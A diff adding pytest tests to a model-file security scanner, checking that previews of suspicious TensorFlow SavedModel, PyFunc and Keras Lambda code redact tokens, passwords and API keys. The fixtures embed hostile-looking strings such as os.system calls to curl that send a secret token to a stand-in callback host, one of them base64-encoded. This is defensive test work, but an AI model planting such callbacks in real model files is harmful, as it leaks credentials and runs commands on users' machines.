@@ -9,7 +9,11 @@ import pytest
 
 from modelaudit.core import determine_exit_code, scan_model_directory_or_file
 from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
-from modelaudit.scanners.tf_savedmodel_scanner import _ASSET_PROBE_BYTES, TensorFlowSavedModelScanner
+from modelaudit.scanners.tf_savedmodel_scanner import (
+    _ASSET_PROBE_BYTES,
+    TensorFlowSavedModelScanner,
+    _safe_decoded_preview,
+)
 from modelaudit.utils.file.detection import PROTO0_1_MAX_PROBE_BYTES
 from modelaudit.utils.tensorflow_compat import has_tensorflow_protobuf_stubs as has_tf_protos
 
@@ -691,6 +695,411 @@ def test_tf_savedmodel_pyfunc_reference_flags_direct_dangerous_refs(tmp_path: Pa
     )
 
 
+def _assert_secret_absent_from_exported_result(result: Any, raw_secret: str) -> None:
+    exported = result.to_json()
+    assert raw_secret not in exported
+    assert "<redacted>" in exported
+
+
+def test_savedmodel_preview_redaction_preserves_benign_context() -> None:
+    preview = _safe_decoded_preview(
+        "os.system('curl https://callback.example/public/model.bin?download=1')",
+        200,
+    )
+
+    assert "os.system" in preview
+    assert "https://callback.example/public/model.bin?download=1" in preview
+    assert "<redacted>" not in preview
+
+
+def test_savedmodel_preview_redaction_removes_generic_url_userinfo() -> None:
+    preview = _safe_decoded_preview(
+        "wss://WEBSOCKETTOKEN@socket.example/stream ftp://user:FTPPASSWORD@files.example/model.bin",
+        200,
+    )
+
+    assert "WEBSOCKETTOKEN" not in preview
+    assert "user:FTPPASSWORD" not in preview
+    assert preview.count("<credentials-redacted>@") == 2
+
+
+def test_savedmodel_preview_redaction_removes_path_capability_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    jwt_token = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.signature"
+    preview = _safe_decoded_preview(
+        f"os.system('curl https://callback.example/{github_token}/model') "
+        f"https://callback.example/api/{jwt_token}/done",
+        500,
+    )
+
+    assert github_token not in preview
+    assert jwt_token not in preview
+    assert "os.system" in preview
+    assert "https://callback.example/<redacted>/model" in preview
+    assert "https://callback.example/api/<redacted>/done" in preview
+
+
+def test_savedmodel_preview_redaction_removes_nested_url_credentials() -> None:
+    preview = _safe_decoded_preview(
+        "https://callback.example/hook?ok=1;to%6ben=SEMICOLONSECRET123 "
+        "https://callback.example/hook?ok=token%253DNESTEDSECRET456 "
+        "https://callback.example/hook?ok=1&amp;token=HTMLSECRET789",
+        500,
+    )
+
+    assert "SEMICOLONSECRET123" not in preview
+    assert "NESTEDSECRET456" not in preview
+    assert "HTMLSECRET789" not in preview
+    assert preview.count("<redacted>") == 3
+
+
+def test_savedmodel_preview_redaction_removes_bracketed_query_credentials() -> None:
+    preview = _safe_decoded_preview(
+        "https://callback.example/hook?api_key[]=ARRAYSECRET123&token[0]=INDEXSECRET456&ok=1",
+        500,
+    )
+
+    assert "ARRAYSECRET123" not in preview
+    assert "INDEXSECRET456" not in preview
+    assert "api_key%5B%5D=<redacted>" in preview
+    assert "token%5B0%5D=<redacted>" in preview
+    assert "ok=1" in preview
+
+
+def test_savedmodel_preview_redaction_removes_python_container_secrets() -> None:
+    preview = _safe_decoded_preview(
+        'private_key = """MULTILINESECRET123\nSTILLSECRET456"""\n'
+        'os.environ["API_KEY"] = "ENVSECRET789"\n'
+        'headers["Authorization"] = "HEADERSECRET000"\n'
+        'config = {"client_secret": "MAPSECRET111", "callback": "https://callback.example/public"}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "MULTILINESECRET123" not in preview
+    assert "STILLSECRET456" not in preview
+    assert "ENVSECRET789" not in preview
+    assert "HEADERSECRET000" not in preview
+    assert "MAPSECRET111" not in preview
+    assert "os.system" in preview
+    assert "https://callback.example/public" in preview
+    assert preview.count("<redacted>") == 4
+
+
+def test_savedmodel_preview_redaction_removes_escaped_quote_secret() -> None:
+    preview = _safe_decoded_preview('api_key = "prefix\\"ESCAPEDSECRET123"\nos.system("id")', 200)
+
+    assert "ESCAPEDSECRET123" not in preview
+    assert 'api_key = "<redacted>"' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_prefixed_and_camel_case_secrets() -> None:
+    preview = _safe_decoded_preview(
+        'api_key = r"RAWSECRET123"\n'
+        'dbPassword = f"DBSECRET456"\n'
+        'headers["githubToken"] = b"GITHUBSECRET789"\n'
+        'config = {"clientSecret": u"MAPSECRET000"}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "RAWSECRET123" not in preview
+    assert "DBSECRET456" not in preview
+    assert "GITHUBSECRET789" not in preview
+    assert "MAPSECRET000" not in preview
+    assert 'api_key = r"<redacted>"' in preview
+    assert 'dbPassword = f"<redacted>"' in preview
+    assert 'headers["githubToken"] = b"<redacted>"' in preview
+    assert '"clientSecret": u"<redacted>"' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_authorization_and_escaped_json_secrets() -> None:
+    preview = _safe_decoded_preview(
+        'Authorization = "ApiKey AUTHSECRET123"\n'
+        "Authorization: ApiKey AUTHSECRET789\n"
+        r'payload="{\"api_key\":\"ESCAPEDJSONSECRET456\", \"safe\":\"ok\"}"'
+        '\nos.system("id")',
+        500,
+    )
+
+    assert "AUTHSECRET123" not in preview
+    assert "AUTHSECRET789" not in preview
+    assert "ESCAPEDJSONSECRET456" not in preview
+    assert 'Authorization = "<redacted>"' in preview
+    assert "Authorization: <redacted>" in preview
+    assert r"\"api_key\":\"<redacted>\"" in preview
+    assert r"\"safe\":\"ok\"" in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_non_scalar_sensitive_values() -> None:
+    preview = _safe_decoded_preview(
+        '{"api_key": ["ARRAYSECRET123"], "clientSecret": {"nested": "OBJECTSECRET456"}, "safe": true}\n'
+        "api_key: |\n"
+        "  BLOCKSECRET789\n"
+        "os.system('id')",
+        500,
+    )
+
+    assert "ARRAYSECRET123" not in preview
+    assert "OBJECTSECRET456" not in preview
+    assert "BLOCKSECRET789" not in preview
+    assert '"api_key": <redacted>' in preview
+    assert '"clientSecret": <redacted>' in preview
+    assert "api_key: |\n  <redacted>" in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_removes_parenthesized_secret_values() -> None:
+    preview = _safe_decoded_preview(
+        'api_key = ("PARENSECRET123")\n'
+        'headers["Authorization"] = (\n  "HEADERSECRET456"\n)\n'
+        'config = {"clientSecret": ("MAPSECRET789")}\n'
+        'os.system("id")',
+        500,
+    )
+
+    assert "PARENSECRET123" not in preview
+    assert "HEADERSECRET456" not in preview
+    assert "MAPSECRET789" not in preview
+    assert 'api_key = ("<redacted>")' in preview
+    assert 'headers["Authorization"] = (\n  "<redacted>"\n)' in preview
+    assert '"clientSecret": ("<redacted>")' in preview
+    assert "os.system" in preview
+
+
+def test_savedmodel_preview_redaction_does_not_expand_original_window() -> None:
+    private_tail = "PRIVATE_AFTER_LONG_SECRET_SHOULD_NOT_APPEAR"
+    preview = _safe_decoded_preview(f'api_key = "{"A" * 10_000}"\n{private_tail}', 80)
+
+    assert "AAAA" not in preview
+    assert private_tail not in preview
+    assert 'api_key = "<redacted>' in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_redacts_boundary_crossing_tokens() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    private_tail = "PRIVATE_AFTER_TOKEN_SHOULD_NOT_APPEAR"
+    preview = _safe_decoded_preview(f"padding{'x' * 62}/{github_token}/{private_tail}", 80)
+
+    assert "ghp_" not in preview
+    assert github_token not in preview
+    assert private_tail not in preview
+    assert "/<redacted>" in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_redacts_boundary_crossing_url_userinfo() -> None:
+    url_prefix = "https://user:very-secret-password"
+    private_tail = "PRIVATE_AFTER_USERINFO_SHOULD_NOT_APPEAR"
+    preview = _safe_decoded_preview(f"{'x' * (80 - len(url_prefix))}{url_prefix}@example.com/{private_tail}", 80)
+
+    assert "user:very-secret-password" not in preview
+    assert "very-secret-password" not in preview
+    assert private_tail not in preview
+    assert "https://<credentials-redacted>" in preview
+    assert preview.endswith("...")
+
+
+def test_savedmodel_preview_redaction_removes_nested_encoded_query_secrets() -> None:
+    preview = _safe_decoded_preview(
+        "first=https://example.com/hook?redirect=https%3A%2F%2Fcb%2F%3Fapi_key%5B%5D%3DNESTEDARRAYSECRET123 "
+        "second=https://example.com/hook?payload=%7B%22api_key%22%3A%22JSONSECRET456%22%7D",
+        500,
+    )
+
+    assert "NESTEDARRAYSECRET123" not in preview
+    assert "JSONSECRET456" not in preview
+    assert "redirect=<redacted>" in preview
+    assert "payload=<redacted>" in preview
+
+
+def test_savedmodel_preview_redaction_removes_nested_redirect_url_secrets() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    preview = _safe_decoded_preview(
+        "first=https://example.com/hook?redirect=https%3A%2F%2Fuser%3Apass%40evil.example%2Fcb "
+        f"second=https://example.com/hook?callback=https%3A%2F%2Fcb.example%2F{github_token}%2Fdone",
+        500,
+    )
+
+    assert "user%3Apass" not in preview
+    assert "user:pass" not in preview
+    assert github_token not in preview
+    assert "redirect=<redacted>" in preview
+    assert "callback=<redacted>" in preview
+
+
+def test_savedmodel_preview_redaction_removes_additional_url_secret_shapes() -> None:
+    github_token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
+    preview = _safe_decoded_preview(
+        f"file:///tmp/{github_token}/model "
+        "ssh://SSHTOKEN@git.example/repo "
+        "ftps://user:FTPSPASSWORD@files.example/model.bin "
+        "https://example.com/hook?token=SEMICOLONSECRET123;STILLSECRET456&ok=1",
+        500,
+    )
+
+    assert github_token not in preview
+    assert "SSHTOKEN" not in preview
+    assert "user:FTPSPASSWORD" not in preview
+    assert "SEMICOLONSECRET123" not in preview
+    assert "STILLSECRET456" not in preview
+    assert "file:///tmp/<redacted>/model" in preview
+    assert "ssh://<credentials-redacted>@git.example/repo" in preview
+    assert "ftps://<credentials-redacted>@files.example/model.bin" in preview
+    assert "token=<redacted>" in preview
+    assert "ok=1" in preview
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_savedmodel_collection_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-collection-secret-value-00000000"
+    collection_payload = (
+        f'os.system("curl https://callback.example/hook?token={raw_secret}")\napi_key="{raw_secret}"\n'
+    ).encode()
+    model_path = _create_test_savedmodel_with_collection(
+        tmp_path,
+        key="runtime_hook",
+        value=collection_payload,
+        model_name="collection_preview_secret",
+    )
+
+    result = TensorFlowSavedModelScanner().scan(model_path)
+    collection_checks = [check for check in result.checks if check.name == "SavedModel Collection Executable Pattern"]
+
+    assert result.has_warnings is True
+    assert collection_checks
+    preview = collection_checks[0].details["value_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-pyfunc-secret-value-00000000"
+    python_code = (
+        f'import os\napi_key = "{raw_secret}"\nos.system("curl https://callback.example/hook?token={raw_secret}")\n'
+    )
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_secret_code",
+                "string_attrs": {"func": python_code},
+            }
+        ],
+        model_name="pyfunc_preview_secret",
+    )
+
+    result = TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_code_preview_redacts_container_secret_values(tmp_path: Path) -> None:
+    raw_secrets = [
+        "c081-multiline-secret-000000",
+        "c081-env-secret-111111",
+        "c081-auth-secret-222222",
+        "c081-map-secret-333333",
+    ]
+    python_code = (
+        "import os\n"
+        'os.system("curl https://callback.example/public")\n'
+        f'private_key = """{raw_secrets[0]}\n{raw_secrets[0]}"""\n'
+        f'os.environ["API_KEY"] = "{raw_secrets[1]}"\n'
+        f'headers = {{"Authorization": "{raw_secrets[2]}", "client_secret": "{raw_secrets[3]}"}}\n'
+    )
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_structured_secret_code",
+                "string_attrs": {"func": python_code},
+            }
+        ],
+        model_name="pyfunc_structured_preview_secret",
+    )
+
+    result = TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Python Code Analysis"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    for raw_secret in raw_secrets:
+        assert raw_secret not in preview
+        _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_pyfunc_invalid_data_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-pyfunc-invalid-secret-000000"
+    python_data = f'api_key = "{raw_secret}"\nif True print("broken")\n'
+    model_path = _create_test_savedmodel_with_scoped_nodes(
+        tmp_path,
+        graph_nodes=[
+            {
+                "op": "PyFunc",
+                "name": "pyfunc_with_secret_data",
+                "string_attrs": {"func": python_data},
+            }
+        ],
+        model_name="pyfunc_data_preview_secret",
+    )
+
+    result = TensorFlowSavedModelScanner().scan(model_path)
+    pyfunc_checks = [check for check in result.checks if check.name == "PyFunc Code Validation"]
+
+    assert result.success is False
+    assert pyfunc_checks
+    preview = pyfunc_checks[0].details["data_preview"]
+    assert "api_key" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
+@pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
+def test_keras_metadata_code_preview_redacts_sensitive_values(tmp_path: Path) -> None:
+    raw_secret = "c081-keras-metadata-secret-000000"
+    decoded_code = (
+        "import os\n"
+        f'client_secret = "{raw_secret}"\n'
+        f'os.system("curl https://callback.example/hook?token={raw_secret}")\n'
+    )
+    encoded_code = base64.b64encode(decoded_code.encode()).decode()
+    metadata_path = tmp_path / "keras_metadata.pb"
+    metadata_path.write_bytes(f'"class_name": "Lambda", "function": {{"items": ["{encoded_code}"]}}'.encode())
+
+    result = TensorFlowSavedModelScanner().scan(str(metadata_path))
+    lambda_checks = [check for check in result.checks if check.name == "Lambda Layer Security Check"]
+
+    assert result.success is False
+    assert lambda_checks
+    preview = lambda_checks[0].details["code_preview"]
+    assert "os.system" in preview
+    assert raw_secret not in preview
+    assert "<redacted>" in preview
+    _assert_secret_absent_from_exported_result(result, raw_secret)
+
+
 @pytest.mark.skipif(not has_tf_protos(), reason="TensorFlow protobuf stubs unavailable")
 def test_scan_keras_metadata_pb_lambda_exec_sets_success_false(tmp_path: Path) -> None:
     """Standalone `keras_metadata.pb` scans should propagate CRITICAL Lambda findings to success=False."""
@@ -1238,6 +1647,33 @@ def test_tf_savedmodel_scanner_unreadable_file(tmp_path: Path, requires_symlinks
 def _create_test_savedmodel_with_op(tmp_path: Path, op_name: str, model_name: str | None = None) -> str:
     """Helper function to create a test SavedModel with a specific TensorFlow operation."""
     return _create_test_savedmodel_with_ops(tmp_path, [op_name], model_name)
+
+
+def _create_test_savedmodel_with_collection(
+    tmp_path: Path,
+    *,
+    key: str,
+    value: bytes,
+    model_name: str,
+) -> str:
+    """Create a SavedModel with one bytes collection entry."""
+    import importlib
+
+    importlib.import_module("modelaudit.protos")
+    from tensorflow.core.protobuf.saved_model_pb2 import SavedModel
+
+    model_dir = tmp_path / model_name
+    model_dir.mkdir()
+
+    saved_model = SavedModel()
+    meta_graph = saved_model.meta_graphs.add()
+    meta_graph.meta_info_def.tags.append("serve")
+    meta_graph.collection_def[key].bytes_list.value.append(value)
+
+    (model_dir / "saved_model.pb").write_bytes(saved_model.SerializeToString())
+    (model_dir / "variables").mkdir()
+
+    return str(model_dir)
 
 
 def _create_test_savedmodel_with_scoped_nodes(
